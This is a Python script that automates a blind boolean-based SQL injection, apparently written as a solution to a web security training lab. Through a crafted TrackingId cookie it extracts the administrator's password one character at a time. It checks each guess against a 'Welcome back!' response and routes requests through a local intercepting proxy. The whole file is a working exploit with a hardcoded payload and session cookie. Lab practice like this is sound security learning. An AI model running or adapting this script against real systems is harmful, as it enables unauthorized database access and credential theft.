import requests
import sys
import urllib3
from bs4  import BeautifulSoup
import re

# this script automates step 3 to 5 step

mylist = "1234567890-=!@#$%^&*()_+qwertyuiop[]asdfghjkl;'zxcvbnm,.{}:\"?></\\"
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_password(url):
    password = ""
    for i in range(1,21):
        for j in range(32,126):
            payload = f"'+and+(select+ascii(substring(password,{i},1))+from+users+where+username+=+'administrator'+)+=+'{j}'+--"
            cookie = {
                "TrackingId":"usZTWfOGRaEcb9dx" + payload,
                "session":"kajzfdmizzmw7anawwcu1ef0vzwngl8l"
            }
            response = requests.get(url,verify=False,cookies=cookie,proxies=proxies)
            if "Welcome back!" in response.text:
                password += chr(j)
                print(f"(+) The char number {i} = {chr(j)}")
                break
    print("(+) The password for the administrator is %s " %password)

def main():
    if len(sys.argv) != 2:

        print("(-) Usage: %s <url>" % sys.argv[0])
        print("(-) Example: %s https://www.example.com  " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retriving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    
    main()
    